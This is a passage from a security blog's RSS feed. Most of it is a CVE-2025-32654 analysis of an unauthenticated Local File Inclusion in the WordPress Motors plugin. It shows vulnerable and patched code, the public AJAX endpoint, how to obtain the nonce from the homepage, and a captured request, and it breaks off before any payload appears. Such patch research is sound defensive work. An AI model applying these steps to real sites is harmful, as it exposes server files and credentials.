paths.&lt;/li&gt;&#xA;&lt;li&gt;Use a &lt;strong&gt;whitelist&lt;/strong&gt; for layouts/templates.&lt;/li&gt;&#xA;&lt;li&gt;Sanitize filenames + use &lt;code&gt;realpath()&lt;/code&gt; + &lt;code&gt;is_readable()&lt;/code&gt; before including.&lt;/li&gt;&#xA;&lt;li&gt;For public endpoints: enforce server-side input controls — nonce alone is not sufficient.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-team-manager/vulnerability/wordpress-team-manager-plugin-2-1-23-local-file-inclusion-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Team Manager Plugin &amp;lt;= 2.1.23 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-32654 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-14-cve-2025-32654/</link>
      <pubDate>Tue, 14 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-14-cve-2025-32654/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-14-cve-2025-32654/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Motors&lt;/strong&gt; plugin, version &lt;strong&gt;≤ 1.4.71&lt;/strong&gt;, contains a &lt;strong&gt;Local File Inclusion (LFI)&lt;/strong&gt; vulnerability that allows an unauthenticated attacker to control a file parameter in an &lt;code&gt;include/require&lt;/code&gt; statement, thereby injecting or reading local files on the server (e.g., configuration files containing credentials). This can lead to &lt;strong&gt;sensitive information disclosure&lt;/strong&gt;, and under certain configurations, &lt;strong&gt;remote code execution&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-32654&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-32654&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.4.71&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.4.72&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS Severity&lt;/strong&gt;: High (8.1)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/motors-car-dealership-classified-listings/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Motors Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; – &lt;strong&gt;Motors&lt;/strong&gt;: &lt;strong&gt;1.4.71&lt;/strong&gt; (vulnerable) and &lt;strong&gt;1.4.72&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; – &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any other comparison (diff) tool to inspect and compare differences between two versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Vulnerable version:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function motors_ew_grid_tabs() {&#xA;&#x9;$template = sanitize_text_field( $_POST[&amp;#39;template&amp;#39;] );&#xA;&#x9;// other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The vulnerable code only sanitizes HTML characters using &lt;a href=&#34;https://developer.wordpress.org/reference/functions/sanitize_text_field/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;sanitize_text_field()&lt;/code&gt;&lt;/a&gt;, without restricting paths — thus an attacker can inject &lt;code&gt;../&lt;/code&gt; or any filename, leading to &lt;strong&gt;LFI&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched version:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function motors_ew_grid_tabs() {&#xA;&#x9;$allowed_templates = array(&#xA;&#x9;&#x9;&amp;#39;listing-cars/listing-grid-directory-loop-4&amp;#39;,&#xA;&#x9;&#x9;&amp;#39;listing-cars/listing-grid-directory-loop-3&amp;#39;,&#xA;&#x9;&#x9;&amp;#39;listing-cars/listing-grid-directory-loop&amp;#39;,&#xA;&#x9;);&#xA;&#x9;$template = &amp;#39;listing-cars/&amp;#39; . ( isset( $_POST[&amp;#39;template&amp;#39;] ) ? sanitize_file_name( $_POST[&amp;#39;template&amp;#39;] ) : &amp;#39;&amp;#39; );&#xA;&#x9;if ( ! in_array( $template, $allowed_templates, true ) ) {&#xA;&#x9;&#x9;wp_send_json_error( &amp;#39;Invalid template&amp;#39; );&#xA;&#x9;&#x9;return;&#xA;&#x9;}&#xA;&#x9;// other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch applies &lt;a href=&#34;https://developer.wordpress.org/reference/functions/sanitize_file_name/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;sanitize_file_name()&lt;/code&gt;&lt;/a&gt; along with a &lt;strong&gt;whitelist&lt;/strong&gt; to validate input, effectively neutralizing any possible exploitation through the &lt;code&gt;template&lt;/code&gt; parameter.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;The function &lt;code&gt;motors_ew_grid_tabs()&lt;/code&gt; is registered as a &lt;strong&gt;callback&lt;/strong&gt; for the &lt;strong&gt;action hook&lt;/strong&gt; &lt;code&gt;&amp;quot;grid_tabs_widget&amp;quot;&lt;/code&gt; via:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_grid_tabs_widget&amp;#39;, array( self::class, &amp;#39;motors_ew_grid_tabs&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The prefix &lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; indicates that this action &lt;strong&gt;does not require user authentication&lt;/strong&gt; to trigger the AJAX endpoint.&#xA;Therefore, the endpoint can be publicly accessed through:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-admin/admin-ajax.php?action=grid_tabs_widget&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When invoked, &lt;code&gt;motors_ew_grid_tabs()&lt;/code&gt; is executed:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function motors_ew_grid_tabs() {&#xA;&#x9;check_ajax_referer( &amp;#39;motors_grid_tabs&amp;#39;, &amp;#39;security&amp;#39; );&#xA;&#xA;&#x9;$listing_types = apply_filters( &amp;#39;stm_listings_post_type&amp;#39;, &amp;#39;listings&amp;#39; );&#xA;&#xA;&#x9;$tab_type = sanitize_text_field( $_POST[&amp;#39;tab_type&amp;#39;] );&#xA;&#x9;$per_page = intval( $_POST[&amp;#39;per_page&amp;#39;] );&#xA;&#x9;$template = sanitize_text_field( $_POST[&amp;#39;template&amp;#39;] );&#xA;&#x9;$img_size = sanitize_text_field( $_POST[&amp;#39;img_size&amp;#39;] );&#xA;&#xA;&#x9;$args = array(&#xA;&#x9;&#x9;&amp;#39;post_type&amp;#39;      =&amp;gt; $listing_types,&#xA;&#x9;&#x9;&amp;#39;post_status&amp;#39;    =&amp;gt; &amp;#39;publish&amp;#39;,&#xA;&#x9;&#x9;&amp;#39;posts_per_page&amp;#39; =&amp;gt; $per_page,&#xA;&#x9;);&#xA;&#xA;&#x9;if ( &amp;#39;popular&amp;#39; === $tab_type ) {&#xA;&#x9;&#x9;$args = array_merge(&#xA;&#x9;&#x9;&#x9;$args,&#xA;&#x9;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&#x9;&amp;#39;orderby&amp;#39;  =&amp;gt; &amp;#39;meta_value_num&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;&amp;#39;meta_key&amp;#39; =&amp;gt; &amp;#39;stm_car_views&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;&amp;#39;order&amp;#39;    =&amp;gt; &amp;#39;DESC&amp;#39;,&#xA;&#x9;&#x9;&#x9;)&#xA;&#x9;&#x9;);&#xA;&#x9;}&#xA;&#xA;&#x9;$args[&amp;#39;meta_query&amp;#39;][] = array(&#xA;&#x9;&#x9;&amp;#39;key&amp;#39;     =&amp;gt; &amp;#39;car_mark_as_sold&amp;#39;,&#xA;&#x9;&#x9;&amp;#39;value&amp;#39;   =&amp;gt; &amp;#39;&amp;#39;,&#xA;&#x9;&#x9;&amp;#39;compare&amp;#39; =&amp;gt; &amp;#39;=&amp;#39;,&#xA;&#x9;);&#xA;&#xA;&#x9;$template_args = array();&#xA;&#x9;if ( ! empty( $img_size ) ) {&#xA;&#x9;&#x9;$template_args = array(&#xA;&#x9;&#x9;&#x9;&amp;#39;custom_img_size&amp;#39; =&amp;gt; $img_size,&#xA;&#x9;&#x9;);&#xA;&#x9;}&#xA;&#xA;&#x9;$listings_query = new WP_Query( $args );&#xA;&#xA;&#x9;if ( $listings_query-&amp;gt;have_posts() ) {&#xA;&#x9;&#x9;$output = &amp;#39;&amp;#39;;&#xA;&#x9;&#x9;ob_start();&#xA;&#x9;&#x9;while ( $listings_query-&amp;gt;have_posts() ) {&#xA;&#x9;&#x9;&#x9;$listings_query-&amp;gt;the_post();&#xA;&#x9;&#x9;&#x9;do_action( &amp;#39;stm_listings_load_template&amp;#39;, $template, $template_args );&#xA;&#x9;&#x9;}&#xA;&#x9;&#x9;$output .= ob_get_clean();&#xA;&#x9;}&#xA;&#xA;&#x9;wp_send_json(&#xA;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&amp;#39;html&amp;#39; =&amp;gt; $output,&#xA;&#x9;&#x9;)&#xA;&#x9;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;At the beginning of &lt;code&gt;motors_ew_grid_tabs()&lt;/code&gt;, this line:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;check_ajax_referer( &amp;#39;motors_grid_tabs&amp;#39;, &amp;#39;security&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;performs a &lt;strong&gt;nonce validation&lt;/strong&gt; to protect against &lt;strong&gt;CSRF (Cross-Site Request Forgery)&lt;/strong&gt;.&#xA;If the nonce provided by the client is invalid or missing, the function halts further AJAX processing — meaning all subsequent logic (handling &lt;code&gt;$template&lt;/code&gt;, post query, and HTML rendering) will &lt;strong&gt;not execute&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function motors_create_nonce() {&#xA;&#x9;$grid_tabs_widget = wp_create_nonce( &amp;#39;motors_grid_tabs&amp;#39; );&#xA;&#x9;// other logic&#xA;&#x9;wp_localize_script(&#xA;&#x9;&#x9;&amp;#39;jquery&amp;#39;,&#xA;&#x9;&#x9;&amp;#39;mew_nonces&amp;#39;,&#xA;&#x9;&#x9;array(&#xA;&#x9;&#x9;&#x9;&amp;#39;motors_grid_tabs&amp;#39; =&amp;gt; $grid_tabs_widget,&#xA;&#x9;&#x9;&#x9;// other logic&#xA;&#x9;&#x9;)&#xA;&#x9;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function &lt;code&gt;motors_create_nonce()&lt;/code&gt; generates the nonce for &lt;code&gt;&#39;motors_grid_tabs&#39;&lt;/code&gt; using &lt;code&gt;wp_create_nonce()&lt;/code&gt; and exposes it to JavaScript via &lt;code&gt;wp_localize_script()&lt;/code&gt; under the variable &lt;code&gt;mew_nonces.motors_grid_tabs&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Tip&lt;/p&gt;&lt;p&gt;Because this vulnerability is &lt;strong&gt;unauthenticated&lt;/strong&gt;, the &lt;strong&gt;nonce&lt;/strong&gt; is not visible in the &lt;strong&gt;admin area&lt;/strong&gt;.&#xA;Instead, after installing the plugin with all dependencies, open the &lt;strong&gt;homepage&lt;/strong&gt;, then search the page source for the keyword &lt;code&gt;motors_grid_tabs&lt;/code&gt; to find the required &lt;strong&gt;nonce value&lt;/strong&gt;.&lt;/p&gt;&lt;/div&gt;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-14-cve-2025-32654/nonce.png&#34;&#xA;    alt=&#34;Nonce value shown in browser source&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Nonce value shown in browser source&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;Additionally, the homepage source contains a JavaScript snippet that &lt;strong&gt;automatically triggers the AJAX call&lt;/strong&gt; to the endpoint in focus:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-admin/admin-ajax.php?action=grid_tabs_widget&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;when the page loads:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;script&amp;gt;&#xA;&#x9;(function($) {&#xA;&#x9;&#x9;$(document).ready(function() {&#xA;&#x9;&#x9;&#x9;$.ajax({&#xA;&#x9;&#x9;&#x9;&#x9;type: &amp;#34;POST&amp;#34;,&#xA;&#x9;&#x9;&#x9;&#x9;url: ajaxurl,&#xA;&#x9;&#x9;&#x9;&#x9;dataType: &amp;#39;json&amp;#39;,&#xA;&#x9;&#x9;&#x9;&#x9;async: true,&#xA;&#x9;&#x9;&#x9;&#x9;data: &amp;#39;action=grid_tabs_widget&amp;amp;tab_type=popular&amp;amp;per_page=8&amp;amp;template=listing-cars/listing-grid-directory-loop-4&amp;amp;img_size=&amp;amp;security=&amp;#39; &amp;#43; mew_nonces.motors_grid_tabs,&#xA;&#x9;&#x9;&#x9;&#x9;success: function(data) {&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;if( data.hasOwnProperty(&amp;#39;html&amp;#39;) ) $(&amp;#39;#popular-tab-content&amp;#39;).html(data.html);&#xA;&#x9;&#x9;&#x9;&#x9;&#x9;updateGridItemTitles();&#xA;&#x9;&#x9;&#x9;&#x9;},&#xA;&#x9;&#x9;&#x9;});&#xA;&#x9;&#x9;});&#xA;&#x9;})(jQuery)&#xA;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This script executes automatically because it’s inside &lt;code&gt;$(document).ready()&lt;/code&gt;, so jQuery runs it when the page finishes loading.&lt;/p&gt;&#xA;&lt;p&gt;Leveraging this, we can reload the homepage and intercept the AJAX request using &lt;strong&gt;BurpSuite&lt;/strong&gt; to capture the required parameters.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0&#xA;Accept: application/json, text/javascript, */*; q=0.01&#xA;...&#xA;action=grid_tabs_widget&amp;amp;tab_type=popular&amp;amp;per_page=8&amp;amp;template=listing-cars/listing-grid-directory-loop-4&amp;amp;img_size=&amp;amp;security=d15dd83890&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We then place a breakpoint in &lt;code&gt;motors_ew_grid_tabs()&lt;/code&gt; right before the response is sent:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;ob_start();&#xA;while ( $listings_query-&amp;gt;have_posts() ) {&#xA;&#x9;$listings_query-&amp;gt;the_post();&#xA;&#x9;do_action( &amp;#39;stm_listings_load_template&amp;#39;, $template, $template_args );&#xA;}&#xA;$output .= ob_get_clean();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This block generates the &lt;strong&gt;dynamic HTML content&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;ob_start()&lt;/code&gt; initializes the output buffer.&lt;/li&gt;&#xA;&lt;li&gt;The &lt;code&gt;while&lt;/code&gt; loop iterates over queried posts and calls &lt;code&gt;do_action( &#39;stm_listings_load_template&#39;, $template, $template_args )&lt;/code&gt; to render each item using the chosen template.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;ob_get_clean()&lt;/code&gt; retrieves and clears the buffer, assigning the result to &lt;code&gt;$output&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;👉 As a result, &lt;code&gt;$output&lt;/code&gt; contains all rendered HTML ready to be returned to the client.&lt;/p&gt;&#xA;&lt;p&gt;When the request is replayed and inspected in the debugger:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-14-cve-2025-32654/debug1.png&#34;&#xA;    alt=&#34;Debugger stepping through post retrieval logic&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Debugger stepping through post retrieval logic&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;We see that with the &lt;strong&gt;default parameters&lt;/strong&gt; sent by the plugin, &lt;code&gt;$listings_query-&amp;gt;have_posts()&lt;/code&gt; is &lt;strong&gt;true&lt;/strong&gt;, thus the hook &lt;code&gt;stm_listings_load_template&lt;/code&gt; executes and processes &lt;code&gt;$template&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;The hook is registered with a callback of the same name:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function stm_listings_load_template( $__template, $__vars = array() ) {&#xA;&#x9;extract( $__vars );&#xA;&#x9;include stm_listings_locate_template( $__template );&#xA;}&#xA;add_action( &amp;#39;stm_listings_load_template&amp;#39;, &amp;#39;stm_listings_load_template&amp;#39;, 10, 2 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;include&lt;/code&gt; statement is the &lt;strong&gt;LFI sink&lt;/strong&gt;.&#xA;Analyzing &lt;code&gt;stm_listings_locate_template()&lt;/code&gt; reveals what path is being included — allowing us to craft our payload.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function stm_listings_locate_template( $templates ) {&#xA;&#x9;$located = false;&#xA;&#xA;&#x9;foreach ( (array) $templates as $template ) {&#xA;&#x9;&#x9;if ( substr( $template, - 4 ) !== &amp;#39;.php&amp;#39; ) {&#xA;&#x9;&#x9;&#x9;$template .= &amp;#39;.php&amp;#39;;&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;if ( str_contains( $template, &amp;#39;partials/&amp;#39; ) ) {&#xA;&#x9;&#x9;&#x9;$located = locate_template( $template );&#xA;&#x9;&#x9;} else {&#xA;&#x9;&#x9;&#x9;$located 